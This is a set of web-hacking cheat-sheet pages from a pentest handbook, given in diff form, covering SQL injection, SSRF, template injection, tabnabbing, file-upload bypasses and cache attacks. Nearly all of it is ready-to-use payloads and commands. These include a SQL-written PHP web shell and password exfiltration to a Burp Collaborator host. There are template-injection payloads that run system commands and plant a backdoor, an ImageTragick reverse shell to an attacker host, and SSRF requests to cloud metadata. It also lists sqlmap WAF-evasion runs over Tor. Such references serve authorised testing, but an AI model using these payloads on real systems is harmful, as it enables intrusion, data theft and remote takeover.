+UNION SELECT "<? system($_REQUEST['cmd']); ?>" INTO OUTFILE "/tmp/shell.php"-
+```
+
+## **Blind SQLi**
+
+```bash
+# Conditional Responses
+
+# Request with:
+Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4
+
+    In the DDBB it does:
+    SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4' - If exists, show content or “Welcome back”
+
+# To detect:
+TrackingId=x'+OR+1=1-- OK
+TrackingId=x'+OR+1=2-- KO
+# User admin exist
+TrackingId=x'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'-- OK
+# Password length
+TrackingId=x'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+length(password)>1--
+
+# So, in the cookie header if first letter of password is greater than ‘m’, or ‘t’ or equal to ‘s’ response will be ok.
+
+xyz' UNION SELECT 'a' FROM Users WHERE Username = 'Administrator' and SUBSTRING(Password, 1, 1) > 'm'--
+xyz' UNION SELECT 'a' FROM Users WHERE Username = 'Administrator' and SUBSTRING(Password, 1, 1) > 't'--
+xyz' UNION SELECT 'a' FROM Users WHERE Username = 'Administrator' and SUBSTRING(Password, 1, 1) = 's'--
+z'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+substring(password,6,1)='§a§'--
+
+# Force conditional responses
+
+TrackingId=x'+UNION+SELECT+CASE+WHEN+(1=1)+THEN+to_char(1/0)+ELSE+NULL+END+FROM+dual-- RETURNS ERROR IF OK
+TrackingId=x'+UNION+SELECT+CASE+WHEN+(1=2)+THEN+to_char(1/0)+ELSE+NULL+END+FROM+dual-- RETURNS NORMALLY IF KO
+TrackingId='+UNION+SELECT+CASE+WHEN+(username='administrator'+AND+substr(password,3,1)='§a§')+THEN+to_char(1/0)+ELSE+NULL+END+FROM+users--;
+
+# Time delays
+TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
+TrackingId=x'; IF (SELECT COUNT(username) FROM Users WHERE username = 'Administrator' AND SUBSTRING(password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
+TrackingId=x'; IF (1=2) WAITFOR DELAY '0:0:10'--
+TrackingId=x'||pg_sleep(10)--
+TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
+TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+substring(password,1,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
+
+# Out-of-Band OAST (Collaborator)
+Asynchronous response
+
+# Confirm:
+TrackingId=x'+UNION+SELECT+extractvalue(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//x.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual--
+
+# Exfil:
+TrackingId=x'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
+TrackingId=x'+UNION+SELECT+extractvalue(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual--
+```
+
+## **Second Order SQLi**
+
+```bash
+# A second-order SQL Injection, on the other hand, is a vulnerability exploitable in two different steps:
+1. Firstly, we STORE a particular user-supplied input value in the DB and
+2. Secondly, we use the stored value to exploit a vulnerability in a vulnerable function in the source code which constructs the dynamic query of the web application.
+
+# Example payload:
+X' UNION SELECT user(),version(),database(), 4 --
+X' UNION SELECT 1,2,3,4 --
+
+# For example, in a password reset query with user "User123' --":
+
+$pwdreset = mysql_query("UPDATE users SET password='getrekt' WHERE username='User123' — ' and password='UserPass@123'");
+
+# Will be:
+
+$pwdreset = mysql_query("UPDATE users SET password='getrekt' WHERE username='User123'");
+
+# So you don't need to know the password.
+
+- User = ' or 'asd'='asd it will return always true
+- User = admin'-- probably not check the password
+```
+
+## **sqlmap**
+
+```bash
+# Post
+sqlmap -r search-test.txt -p tfUPass
+
+# Get
+sqlmap -u "http://10.11.1.111/index.php?id=1" --dbms=mysql
+
+# Crawl
+sqlmap -u http://10.11.1.111 --dbms=mysql --crawl=3
+
+# Full auto - FORMS
+sqlmap -u 'http://10.11.1.111:1337/978345210/index.php' --forms --dbs --risk=3 --level=5 --threads=4 --batch
+# Columns 
+sqlmap -u 'http://admin.cronos.htb/index.php' --forms --dbms=MySQL --risk=3 --level=5 --threads=4 --batch --columns -T users -D admin
+# Values
+sqlmap -u 'http://admin.cronos.htb/index.php' --forms --dbms=MySQL --risk=3 --level=5 --threads=4 --batch --dump -T users -D admin
+
+sqlmap -o -u "http://10.11.1.111:1337/978345210/index.php" --data="username=admin&password=pass&submit=+Login+" --method=POST --level=3 --threads=10 --dbms=MySQL --users --passwords
+
+# SQLMAP WAF bypass
+
+sqlmap --level=5 --risk=3 --random-agent --user-agent -v3 --batch --threads=10 --dbs
+sqlmap --dbms="MySQL" -v3 --technique U --tamper="space2mysqlblank.py" --dbs
+sqlmap --dbms="MySQL" -v3 --technique U --tamper="space2comment" --dbs
+sqlmap -v3 --technique=T --no-cast --fresh-queries --banner
+sqlmap -u http://www.example.com/index?id=1 --level 2 --risk 3 --batch --dbs
+
+
+sqlmap -f -b --current-user --current-db --is-dba --users --dbs
+sqlmap --risk=3 --level=5 --random-agent --user-agent -v3 --batch --threads=10 --dbs
+sqlmap --risk 3 --level 5 --random-agent --proxy http://123.57.48.140:8080 --dbs
+sqlmap --random-agent --dbms=MYSQL --dbs --technique=B"
+sqlmap --identify-waf --random-agent -v 3 --dbs
+
+1 : --identify-waf --random-agent -v 3 --tamper="between,randomcase,space2comment" --dbs
+2 : --parse-errors -v 3 --current-user --is-dba --banner -D eeaco_gm -T #__tabulizer_user_preferences --column --random-agent --level=5 --risk=3
+
+sqlmap --threads=10 --dbms=MYSQL --tamper=apostrophemask --technique=E -D joomlab -T anz91_session -C session_id --dump
+sqlmap --tables -D miss_db --is-dba --threads="10" --time-sec=10 --timeout=5 --no-cast --tamper=between,modsecurityversioned,modsecurityzeroversioned,charencode,greatest --identify-waf --random-agent
+sqlmap -u http://192.168.0.107/test.php?id=1 -v 3 --dbms "MySQL" --technique U -p id --batch --tamper "space2morehash.py"
+sqlmap --banner --safe-url=2 --safe-freq=3 --tamper=between,randomcase,charencode -v 3 --force-ssl --dbs --threads=10 --level=2 --risk=2
+sqlmap -v3 --dbms="MySQL" --risk=3 --level=3 --technique=BU --tamper="space2mysqlblank.py" --random-agent -D damksa_abr -T admin,jobadmin,member --colu
+
+sqlmap --wizard
+sqlmap --level=5 --risk=3 --random-agent --tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes --dbms=mssql
+sqlmap -url www.site.ps/index.php --level 5 --risk 3 tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor --dbms=mssql
+sqlmap -url www.site.ps/index.php --level 5 --risk 3 tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes --dbms=mssql
+
+# Tamper suggester
+https://github.com/m4ll0k/Atlas
+
+--tamper "randomcase.py" --tor --tor-type=SOCKS5 --tor-port=9050 --dbs --dbms "MySQL" --current-db --random-agent
+--tamper "randomcase.py" --tor --tor-type=SOCKS5 --tor-port=9050 --dbs --dbms "MySQL" --current-db --random-agent -D "pache_PACHECOCARE" --tables
+--tamper "randomcase.py" --tor --tor-type=SOCKS5 --tor-port=9050 --dbs --dbms "MySQL" --current-db --random-agent -D "pache_PACHECOCARE" -T "edt_usuarios" --columns
+--tamper "randomcase.py" --tor --tor-type=SOCKS5 --tor-port=9050 --dbs --dbms "MySQL" --current-db --random-agent -D "pache_PACHECOCARE" -T "edt_usuarios" -C "ud,email,usuario,contra" --dump
+# Tamper list
+between.py,charencode.py,charunicodeencode.py,equaltolike.py,greatest.py,multiplespaces.py,nonrecursivereplacement.py,percent
+```
+END_FILE
+START_FILE: Docs/six2dez pentest-book master enumeration-web/ssrf.md
+# SSRF
+
+## Tools
+
+```bash
+# https://github.com/tarunkant/Gopherus
+gopherus --exploit [PLATFORM]
+# https://github.com/daeken/SSRFTest
+# https://github.com/jmdx/TLS-poison/
+# https://github.com/m4ll0k/Bug-Bounty-Toolz
+# https://github.com/cujanovic/SSRF-Testing
+# https://github.com/bcoles/ssrf_proxy
+
+gau domain.com | python3 ssrf.py collab.listener.com
+
+# https://github.com/micha3lb3n/SSRFire
+./ssrfire.sh -d domain.com -s yourserver.com -f /path/to/copied_raw_urls.txt
+
+# SSRF Redirect Payload generator
+# https://tools.intigriti.io/redirector/
+```
+
+## Summary
+
+{% hint style="info" %}
+Server-side request forgery (also known as SSRF) is a web security vulnerability that allows an attacker to induce the server-side application to make HTTP requests to an arbitrary domain of the attacker's choosing. In typical SSRF examples, the attacker might cause the server to make a connection back to itself, or to other web-based services within the organization's infrastructure, or to external third-party systems.
+{% endhint %}
+
+```bash
+# Web requesting other ip or ports like 127.0.0.1:8080 or 192.168.0.1
+chat:3000/ssrf?user=&comment=&link=http://127.0.0.1:3000
+GET /ssrf?user=&comment=&link=http://127.0.0.1:3000 HTTP/1.1
+```
+
+## SSRF Attacks
+
+```bash
+# Check if you're able to enum IP or ports
+127.0.0.1
+127.0.1
+127.1
+127.000.000.001
+2130706433
+0x7F.0x00.0x00.0x01
+0x7F.1
+0x7F000001
+
+# Quick URL based bypasses:
+http://google.com:80+&@127.88.23.245:22/#+@google.com:80/
+http://127.88.23.245:22/+&@google.com:80#+@google.com:80/
+http://google.com:80+&@google.com:80#+@127.88.23.245:22/
+http://127.88.23.245:22/?@google.com:80/
+http://127.88.23.245:22/#@www.google.com:80/
+
+# 301 responses:
+https://ssrf.localdomain.pw/img-without-body/301-http-169.254.169.254:80-.i.jpg
+https://ssrf.localdomain.pw/img-without-body-md/301-http-.i.jpg
+https://ssrf.localdomain.pw/img-with-body/301-http-169.254.169.254:80-.i.jpg
+https://ssrf.localdomain.pw/img-with-body-md/301-http-.i.jpg
+
+# 301 json:
+https://ssrf.localdomain.pw/json-without-body/301-http-169.254.169.254:80-.j.json
+https://ssrf.localdomain.pw/json-without-body-md/301-http-.j.json
+https://ssrf.localdomain.pw/json-with-body/301-http-169.254.169.254:80-.j.json
+https://ssrf.localdomain.pw/json-with-body-md/301-http-.j.json
+
+# 301 csv:
+https://ssrf.localdomain.pw/csv-without-body/301-http-169.254.169.254:80-.c.csv
+https://ssrf.localdomain.pw/csv-without-body-md/301-http-.c.csv
+https://ssrf.localdomain.pw/csv-with-body/301-http-169.254.169.254:80-.c.csv
+https://ssrf.localdomain.pw/csv-with-body-md/301-http-.c.csv
+
+# 301 xml:
+https://ssrf.localdomain.pw/xml-without-body/301-http-169.254.169.254:80-.x.xml
+https://ssrf.localdomain.pw/xml-without-body-md/301-http-.x.xml
+https://ssrf.localdomain.pw/xml-with-body/301-http-169.254.169.254:80-.x.xml
+https://ssrf.localdomain.pw/xml-with-body-md/301-http-.x.xml
+
+# 301 pdf:
+https://ssrf.localdomain.pw/pdf-without-body/301-http-169.254.169.254:80-.p.pdf
+https://ssrf.localdomain.pw/pdf-without-body-md/301-http-.p.pdf
+https://ssrf.localdomain.pw/pdf-with-body/301-http-169.254.169.254:80-.p.pdf
+https://ssrf.localdomain.pw/pdf-with-body-md/301-http-.p.pdf
+
+# 30x custom:
+https://ssrf.localdomain.pw/custom-30x/?code=332&url=http://169.254.169.254/&content-type=YXBwbGljYXRpb24vanNvbg==&body=eyJhIjpbeyJiIjoiMiIsImMiOiIzIn1dfQ==&fakext=/j.json
+
+# 20x custom:
+https://ssrf.localdomain.pw/custom-200/?url=http://169.254.169.254/&content-type=YXBwbGljYXRpb24vanNvbg==&body=eyJhIjpbeyJiIjoiMiIsImMiOiIzIn1dfQ==&fakext=/j.json
+
+# 201 custom:
+https://ssrf.localdomain.pw/custom-201/?url=http://169.254.169.254/&content-type=YXBwbGljYXRpb24vanNvbg==&body=eyJhIjpbeyJiIjoiMiIsImMiOiIzIn1dfQ==&fakext=/j.json
+
+# HTML iframe + URL bypass
+http://ssrf.localdomain.pw/iframe/?proto=http&ip=127.0.0.1&port=80&url=/
+
+# SFTP
+http://whatever.com/ssrf.php?url=sftp://evil.com:11111/
+
+evil.com:$ nc -v -l 11111
+Connection from [192.168.0.10] port 11111 [tcp/*] accepted (family 2, sport 36136)
+SSH-2.0-libssh2_1.4.2
+
+# Dict
+http://safebuff.com/ssrf.php?dict://attacker:11111/
+
+evil.com:$ nc -v -l 11111
+Connection from [192.168.0.10] port 11111 [tcp/*] accepted (family 2, sport 36136)
+CLIENT libcurl 7.40.0
+
+# gopher
+# http://safebuff.com/ssrf.php?url=http://evil.com/gopher.php
+<?php
+        header('Location: gopher://evil.com:12346/_HI%0AMultiline%0Atest');
+?>
+
+evil.com:# nc -v -l 12346
+Listening on [0.0.0.0] (family 0, port 12346)
+Connection from [192.168.0.10] port 12346 [tcp/*] accepted (family 2, sport 49398)
+HI
+Multiline
+test
+
+# TFTP
+# http://safebuff.com/ssrf.php?url=tftp://evil.com:12346/TESTUDPPACKET
+
+evil.com:# nc -v -u -l 12346
+Listening on [0.0.0.0] (family 0, port 12346)
+TESTUDPPACKEToctettsize0blksize512timeout6
+
+# file
+http://safebuff.com/redirect.php?url=file:///etc/passwd
+
+# ldap
+http://safebuff.com/redirect.php?url=ldap://localhost:11211/%0astats%0aquit
+
+# SSRF Bypasses
+?url=http://safesite.com&site.com
+?url=http://////////////site.com/
+?url=http://site@com/account/edit.aspx
+?url=http://site.com/account/edit.aspx
+?url=http://safesite.com?.site.com
+?url=http://safesite.com#.site.com
+?url=http://safesite.com\.site.com/domain
+?url=https://ⓈⒾⓉⒺ.ⓒⓞⓜ = site.com
+?url=https://192.10.10.3/
+?url=https://192.10.10.2?.192.10.10.3/
+?url=https://192.10.10.2#.192.10.10.3/
+?url=https://192.10.10.2\.192.10.10.3/
+?url=http://127.0.0.1/status/
+?url=http://localhost:8000/status/
+?url=http://site.com/domain.php
+<?php
+header(‘Location: http://127.0.0.1:8080/status');
+?>
+
+# Localhost bypasses
+0
+127.00.1
+127.0.01
+0.00.0
+0.0.00
+127.1.0.1
+127.10.1
+127.1.01
+0177.1
+0177.0001.0001
+0x0.0x0.0x0.0x0
+0000.0000.0000.0000
+0x7f.0x0.0x0.0x1
+0177.0000.0000.0001
+0177.0001.0000..0001
+0x7f.0x1.0x0.0x1
+0x7f.0x1.0x1
+
+# Blind SSRF
+- Review Forms
+- Contact Us
+- Password fields
+- Contact or profile info (Names, Addresses)
+- User Agent
+
+# SSRF through video upload
+# https://hackerone.com/reports/1062888
+# https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/CVE%20Ffmpeg%20HLS
+
+# SSRF in pdf rendering
+<svg xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" class="highcharts-root" width="800" height="500">
+    <g>
+        <foreignObject width="800" height="500">
+            <body xmlns="http://www.w3.org/1999/xhtml">
+                <iframe src="http://169.254.169.254/latest/meta-data/" width="800" height="500"></iframe>
+            </body>
+        </foreignObject>
+    </g>
+</svg>
+```
+
+SSRF Bypasses
+
+```bash
+http://%32%31%36%2e%35%38%2e%32%31%34%2e%32%32%37
+http://%73%68%6d%69%6c%6f%6e%2e%63%6f%6d
+http://////////////site.com/
+http://0000::1:80/
+http://000330.0000072.0000326.00000343
+http://000NaN.000NaN
+http://0177.00.00.01
+http://017700000001
+http://0330.072.0326.0343
+http://033016553343
+http://0NaN
+http://0NaN.0NaN
+http://0x0NaN0NaN
+http://0x7f000001/
+http://0xd8.0x3a.0xd6.0xe3
+http://0xd8.0x3a.0xd6e3
+http://0xd8.0x3ad6e3
+http://0xd83ad6e3
+http://0xNaN.0xaN0NaN
+http://0xNaN.0xNa0x0NaN
+http://0xNaN.0xNaN
+http://127.0.0.1/status/
+http://127.1/
+http://2130706433/
+http://216.0x3a.00000000326.0xe3
+http://3627734755
+http://[::]:80/
+http://localhost:8000/status/
+http://NaN
+http://safesite.com#.site.com
+http://safesite.com&site.com
+http://safesite.com?.site.com
+http://safesite.com\.site.com/domain
+http://shmilon.0xNaN.undefined.undefined
+http://site.com/account/edit.aspx
+http://site.com/domain.php
+http://site@com/account/edit.aspx
+http://whitelisted@127.0.0.1
+https://192.10.10.2#.192.10.10.3/
+https://192.10.10.2?.192.10.10.3/
+https://192.10.10.2\.192.10.10.3/
+https://192.10.10.3/
+https://ⓈⒾⓉⒺ.ⓒⓞⓜ = site.com
+<?php
+header('Location: http://127.0.0.1:8080/status');
+?>
+
+# Tool
+# https://h.43z.one/ipconverter/
+```
+
+## PDF SSRF
+
+{% embed url="https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-pdf-generators-a-complete-guide-to-finding-ssrf-vulnerabilities-in-pdf-generators" %}
+
+## Mindmap
+
+![](<../../.gitbook/assets/image (14).png>)
+END_FILE
+START_FILE: Docs/six2dez pentest-book master enumeration-web/ssti.md
+# SSTI
+
+```
+# Tool
+# https://github.com/epinna/tplmap
+tplmap.py -u 'http://www.target.com/page?name=John'
+
+# Payloads
+# https://github.com/payloadbox/ssti-payloads
+
+# Oneliner
+# Check SSTI in all param with qsreplace
+waybackurls http://target.com | qsreplace "ssti{{9*9}}" > fuzz.txt
+ffuf -u FUZZ -w fuzz.txt -replay-proxy http://127.0.0.1:8080/
+# Check in burp for reponses with ssti81
+
+# Generic
+${{<%[%'"}}%\.
+{% debug %}
+{7*7}
+{{ '7'*7 }}
+{{ [] .class.base.subclassesO }}
+{{''.class.mro()[l] .subclassesO}}
+for c in [1,2,3] %}{{ c,c,c }}{% endfor %}
+{{ [].__class__.__base__.__subclasses__O }}
+
+# PHP Based
+{php}print "Hello"{/php}
+{php}$s = file_get_contents('/etc/passwd',NULL, NULL, 0, 100); var_dump($s);{/php}
+{{7*7}}
+{{7*'7'}}
+{{dump(app)}}
+{{app.request.server.all|join(',')}}
+"{{'/etc/passwd'|file_excerpt(1,30)}}"@
+{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
+{$smarty.version}
+{php}echo `id`;{/php}
+{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
+
+# Node.js Backend based 
+{{ this }}-> [Object Object]
+{{ this.__proto__ }}-> [Object Object]
+{{ this.__proto__.constructor.name }}-> Object
+{{this.constructor.constructor}}
+{{this. constructor. constructor('process.pid')()}}
+{{#with "e"}}
+{{#with split as |conslist|}}
+{{this.pop}}
+{{this.push (lookup string.sub "constructor")}}
+{{this.pop}}
+{{#with string.split as |codelist|}}
+{{this.pop}}
+{{this.push "return require('child_process').exec('whoami');"}}
+{{this.pop}}
+{{#each conslist}}
+{{#with (string.sub.apply 0 codelist)}}
+{{this}}
+{{/with}}
+{{/each}}
+#set($str=$class.inspect("java.lang.String").type)
+#set($chr=$class.inspect("java.lang.Character").type)
+#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
+$ex.waitFor()
+#set($out=$ex.getInputStream())
+#foreach($i in [1..$out.available()])
+$str.valueOf($chr.toChars($out.read()))
+#end
+
+# Java
+${7*7}
+<#assign command="freemarker.template.utility.Execute"?new()> ${ command("cat /etc/passwd") }
+${{7*7}}
+${class.getClassLoader()}
+${class.getResource("").getPath()}
+${class.getResource("../../../../../index.htm").getContent()}
+${T(java.lang.System).getenv()}
+${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(" ")}
+
+# Ruby
+<%= system("whoami") %>
+<%= Dir.entries('/') %>
+<%= File.open('/example/arbitrary-file').read %>
+
+# Python
+{% debug %}
+{{settings.SECRET_KEY}}
+{% import foobar %} = Error
+{% import os %}{{os.system('whoami')}}
+
+# Perl
+<%= perl code %>
+<% perl code %>
+
+# Flask/Jinja2
+{{ '7'*7 }}
+{{ [].class.base.subclasses() }} # get all classes
+{{''.class.mro()[1].subclasses()}}
+{%for c in [1,2,3] %}{{c,c,c}}{% endfor %}
+{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
+
+# .Net
+@(1+2)
+@{// C# code}
+```
+END_FILE
+START_FILE: Docs/six2dez pentest-book master enumeration-web/tabnabbing.md
+# Tabnabbing
+
+## Summary
+
+{% hint style="info" %}
+Where a page linked from the target page is able to rewrite that page, for example to replace it with a phishing site. As the user was originally on the correct page they are less likely to notice that it has been changed to a phishing site, especially it the site looks the same as the target. If the user authenticates to this new page then their credentials \(or other sensitive data\) are sent to the phishing site rather than the legitimate one.
+{% endhint %}
+
+Attacker searches for links that are inserted into the website and are under his control. Such links may be contained in a forum post, for example. Once he has found this kind of functionality, it checks that the link's `rel` attribute does not contain the value `noopener` and the target attribute contains the value `_blank`. If this is the case, the website is vulnerable to tabnabbing.
+
+## Attack
+
+```text
+Search for:
+<a href="..." target="_blank" rel="" />  
+<a href="..." target="_blank" />
+
+1. Attacker posts a link to a website under his control that contains the following JS code: window.opener.location = "http://evil.com"
+2. He tricks the victim into visiting the link, which is opened in the browser in a new tab.
+3. At the same time the JS code is executed and the background tab is redirected to the website evil.com, which is most likely a phishing website.
+4. If the victim opens the background tab again and doesn't look at the address bar, it may happen that he thinks he is logged out, because a login page appears, for example.
+5. The victim tries to log on again and the attacker receives the credentials
+```
+
+END_FILE
+START_FILE: Docs/six2dez pentest-book master enumeration-web/upload-bypasses.md
+# File upload
+
+```
+# File name validation
+    # extension blacklisted:
+    PHP: .phtm, phtml, .phps, .pht, .php2, .php3, .php4, .php5, .shtml, .phar, .pgif, .inc
+    ASP: .asp, .aspx, .cer, .asa
+    Jsp: .jsp, .jspx, .jsw, .jsv, .jspf
+    Coldfusion: .cfm, .cfml, .cfc, .dbm
+    Using random capitalization: .pHp, .pHP5, .PhAr
+    pht,phpt,phtml,php3,php4,php5,php6,php7,phar,pgif,phtm,phps,shtml,phar,pgif,inc
+    # extension whitelisted:
+    file.jpg.php
+    file.php.jpg
+    file.php.blah123jpg
+    file.php%00.jpg
+    file.php\x00.jpg
+    file.php%00
+    file.php%20
+    file.php%0d%0a.jpg
+    file.php.....
+    file.php/
+    file.php.\
+    file.
+    .html
+# Content type bypass
+    - Preserve name, but change content-type
+    Content-Type: image/jpeg, image/gif, image/png
+# Content length:
+    # Small bad code:
+    <?='$_GET[x]'?>
+    
+# Impact by extension
+asp, aspx, php5, php, php3: webshell, rce
+svg: stored xss, ssrf, xxe
+gif: stored xss, ssrf
+csv: csv injection
+xml: xxe
+avi: lfi, ssrf
+html, js: html injection, xss, open redirect
+png, jpeg: pixel flood attack dos
+zip: rce via lfi, dos
+pdf, pptx: ssrf, blind xxe
+
+# Path traversal
+../../etc/passwd/logo.png
+../../../logo.png
+
+# SQLi
+'sleep(10).jpg
+sleep(10)-- -.jpg
+
+# Command injection
+; sleep 10;
+
+# ImageTragick
+push graphic-context
+viewbox 0 0 640 480
+fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
+pop graphic-context
+
+# XXE .svg
+<?xml version="1.0" standalone="yes"?>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
+<svg width="500px" height="500px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1
+<text font-size="40" x="0" y="16">&xxe;</text>
+</svg>
+
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
+<image xlink:href="expect://ls"></image>
+</svg>
+
+# XSS svg
+<svg onload=alert(document.comain)>.svg
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+File Upload Checklist 3
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+<rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
+<script type="text/javascript">
+alert("HolyBugx XSS");
+</script>
+</svg>
+
+# Open redirect svg
+<code>
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<svg
+onload="window.location='https://attacker.com'"
+xmlns="http://www.w3.org/2000/svg">
+<rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
+</svg>
+</code>
+    
+# Filter Bypassing Techniques
+# upload asp file using .cer & .asa extension (IIS — Windows)
+# Upload .eml file when content-type = text/HTML
+# Inject null byte shell.php%001.jpg
+# Check for .svg file upload you can achieve stored XSS using XML payload
+# put file name ../../logo.png or ../../etc/passwd/logo.png to get directory traversal via upload file
+# Upload large size file for DoS attack test using the image.
+# (magic number) upload shell.php change content-type to image/gif and start content with GIF89a; will do the job!
+# If web app allows for zip upload then rename the file to pwd.jpg bcoz developer handle it via command
+# upload the file using SQL command 'sleep(10).jpg you may achieve SQL if image directly saves to DB.
+
+# Advance Bypassing techniques
+# Imagetragick aka ImageMagick:
+https://mukarramkhalid.com/imagemagick-imagetragick-exploit/
+https://github.com/neex/gifoeb
+    
+# Upload file tool
+https://github.com/almandin/fuxploider
+python3 fuxploider.py --url https://example.com --not-regex "wrong file type"
+
+https://github.com/sAjibuu/upload_bypass
+```
+
+### Cheatsheet
+
+```
+upload.random123		---	To test if random file extensions can be uploaded.
+upload.php			---	try to upload a simple php file.
+upload.php.jpeg 		--- 	To bypass the blacklist.
+upload.jpg.php 			---	To bypass the blacklist. 
+upload.php 			---	and Then Change the content type of the file to image or jpeg.
+upload.php*			---	version - 1 2 3 4 5 6 7.
+upload.PHP			---	To bypass The BlackList.
+upload.PhP			---	To bypass The BlackList.
+upload.pHp			---	To bypass The BlackList.
+upload .htaccess 		--- 	By uploading this [jpg,png] files can be executed as php with milicious code within it.
+pixelFlood.jpg			---	To test againt the DOS.
+frameflood.gif			---	upload gif file with 10^10 Frames
+Malicious zTXT  		--- 	upload UBER.jpg 
+Upload zip file			---	test againts Zip slip (only when file upload supports zip file)
+Check Overwrite Issue		--- 	Upload file.txt and file.txt with different content and check if 2nd file.txt overwrites 1st file
+SVG to XSS			---	Check if you can upload SVG files and can turn them to cause XSS on the target app
+SQLi Via File upload		---	Try uploading `sleep(10)-- -.jpg` as file
+```
+
+![](<../../.gitbook/assets/image (16).png>)
+END_FILE
+START_FILE: Docs/six2dez pentest-book master enumeration-web/vhosts.md
+# VHosts
+
+```text
+**Tools** 
+https://github.com/jobertabma/virtual-host-discovery
+ruby scan.rb --ip=192.168.1.101 --host=domain.tld
+
+# Enum vhosts
+fierce -dns example.com
+
+# Find Vhosts in non resolvable domains
+https://github.com/dariusztytko/vhosts-sieve
+python3 vhosts-sieve.py -d domains.txt -o vhosts.txt
+```
+
+END_FILE
+START_FILE: Docs/six2dez pentest-book master enumeration-web/web-cache-deception.md
+# Web Cache Deception
+
+{% hint style="info" %}
+These preconditions can be exploited for the Web Cache Deception attack in the following manner:
+
+* Step 1: An attacker entices the victim to open a maliciously crafted link:
+
+  `https://www.example.com/my_profile/test.jpg`
+
+  The application ignores the 'test.jpg' part of the URL, the victim profile page is loaded. The caching mechanism identifies the resource as an image, caching it.
+
+* Step 2: The attacker sends a GET request for the cached page:
+
+  `https://www.example.com/my_profile/test.jpg`
+
+  The cached resource, which is in fact the victim profile page is returned to the attacker \(and to anyone else requesting it\).
+{% endhint %}
+
+END_FILE
+START_FILE: Docs/six2dez pentest-book master enumeration-web/web-cache-poisoning.md
+# Web Cache Poisoning
+
+## General
+
+{% hint style="info" %}
+Web cache poisoning is an advanced technique whereby an attacker exploits the behavior of a web server and cache so that a harmful HTTP response is served to other users.
+
+Fundamentally, web cache poisoning involves two phases. First, the attacker must work out how to elicit a response from the back-end server that inadvertently contains some kind of dangerous payload. Once successful, they need to make sure that their response is cached and subsequently served to the intended victims.
+
+A poisoned web cache can potentially be a devastating means of distributing numerous different attacks, exploiting vulnerabilities such as XSS, JavaScript injection, open redirection, and so on.
+{% endhint %}
+
+## Tools
+
+```bash
+# https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner
+wcvs -u https://url.com
+# https://github.com/s0md3v/Arjun
+python3 arjun.py -u https://url.com --get 
+python3 arjun.py -u https://url.com --post
+# https://github.com/maK-/parameth
+python parameth.py -u https://example.com/test.php
+# https://github.com/devanshbatham/ParamSpider
+python3 paramspider.py --domain example.com
+# https://github.com/s0md3v/Parth
+python3 parth.py -t example.com
+```
+
+```markup
+# XSS for users accessing /en?region=uk:
+GET /en?region=uk HTTP/1.1
+Host: innocent-website.com
+X-Forwarded-Host: a."><script>alert(1)</script>"
+```
+
